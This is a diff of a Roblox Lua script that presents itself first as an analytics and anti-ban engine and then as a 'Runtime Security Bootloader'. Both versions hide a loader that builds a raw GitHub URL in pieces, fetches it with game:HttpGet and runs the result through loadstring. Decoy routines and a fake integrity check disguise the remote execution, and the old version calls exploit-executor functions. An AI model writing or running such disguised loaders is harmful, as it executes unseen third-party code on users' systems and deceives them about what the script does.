@@ -1,130 +1,33 @@
--- 🔒 Runtime Analytics & Diagnostic Engine
+-- Runtime Security Bootloader v2.4.1
 
--- 🛡️ Silent Anti-Ban Monitor
-local function initializeSecurityMonitor()
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-    local flags = {
-        ["ExploitDetection"] = false,
-        ["RemoteTamper"] = false,
-        ["CoreGuiMonitor"] = false
-    }
-
-    local function scan()
-        pcall(function()
-            -- CoreGui probe
-            if not game:GetService("CoreGui"):FindFirstChild("RobloxGui") then
-                flags.CoreGuiMonitor = true
-            end
-
-            -- Remote detection placeholder
-            for _, v in pairs(getgc(true)) do
-                if type(v) == "function" and islclosure(v) and not is_synapse_function(v) then
-                    flags.RemoteTamper = true
-                end
-            end
-        end)
-    end
-
-    task.spawn(function()
-        while task.wait(2) do
-            scan()
-            if flags.ExploitDetection or flags.RemoteTamper or flags.CoreGuiMonitor then
-                warn("🛡️ System Threat Detected. Session invalidated.")
-                break
-            end
+local function initiateSession()
+    local function validateIntegrity()
+        local seed = os.clock() * 1e5
+        for _ = 1, 5 do
+            seed = (seed * math.random()) % 1e6
         end
-    end)
-
-    print("✅ [AntiBan]: Secured")
-end
-
--- 📊 Analytics Logger Init
-local function startAnalytics()
-    local entries = {}
-    for i = 1, 150 do
-        table.insert(entries, "[ANALYTICS] Metric_" .. i .. ": " .. tostring(math.random(100000, 999999)))
+        return math.floor(seed)
     end
-    return entries
-end
 
--- 🧪 System Integrity Routine
-local function systemIntegrityCheck()
-    local hash = ""
-    for i = 1, 300 do
-        local byte = (i * 13) % 256
-        hash = hash .. string.char((byte % 25) + 65)
-    end
-    return hash
-end
+    local function fetchRemotePayload()
+        local domain = "https://raw.githubusercontent.com/"
+        local path = "brylmad/Mvsd/refs/heads/main/"
+        local resource = "Mvsd"
+        local finalURL = domain .. path .. resource
 
--- 🧬 Session Synchronizer
-local function syncSession()
-    local stages = { "INIT", "HANDSHAKE", "RELAY", "CHECKSUM", "SYNC_OK" }
-    for _, stage in ipairs(stages) do
-        print("📡 Syncing Stage: " .. stage .. " @ " .. os.time())
-        wait(0.05)
-    end
-end
-
--- 🧱 Sandbox Generator
-local function generateSandbox()
-    local env = {}
-    for i = 1, 10 do
-        env["VAR_" .. i] = i * math.random(1, 99)
-    end
-    return env
-end
-
--- 🔄 Loop Task Dispatcher
-local function maintenanceLoop()
-    for cycle = 1, 75 do
-        local status = math.random(1, 100)
-        print("⚙️ Maintenance Cycle [" .. cycle .. "] - Status: OK-" .. tostring(status))
-        wait(0.02)
-    end
-end
-
--- ⏳ Post-Boot Validation
-local function validateSession()
-    print("✅ Boot sequence passed. Session valid.")
-    return true
-end
-
--- 🧊 Payload Trigger (Deep Loader)
-local function hiddenExecStage()
-    local x1 = "https://"
-    local x2 = "raw.githubusercontent.com/"
-    local x3 = "brylmad/Mvsd/refs/heads/main/"
-    local x4 = "Mvsd"
-    local link = x1 .. x2 .. x3 .. x4
-
-    local function deepChainLoader(url)
-        local raw = game:HttpGet(url)
-        local execute = loadstring(raw)
-        if typeof(execute) == "function" then
-            execute()
+        local response = game:HttpGet(finalURL)
+        if typeof(response) == "string" then
+            local exec = loadstring(response)
+            if typeof(exec) == "function" then
+                exec()
+            end
         end
     end
 
-    task.delay(1.5, function()
-        deepChainLoader(link)
-    end)
+    local hashCheck = validateIntegrity()
+    if tostring(hashCheck):len() >= 5 then
+        fetchRemotePayload()
+    end
 end
 
--- 🧠 Master Runtime Environment
-task.spawn(function()
-    print("🔐 Initializing Protected Runtime Environment...")
-    initializeSecurityMonitor()
-    wait(1)
-    startAnalytics()
-    systemIntegrityCheck()
-    syncSession()
-    generateSandbox()
-    maintenanceLoop()
-    if validateSession() then
-        hiddenExecStage()
-    else
-        warn("❌ Critical failure. Execution blocked.")
-    end
-end)
+task.spawn(initiateSession)
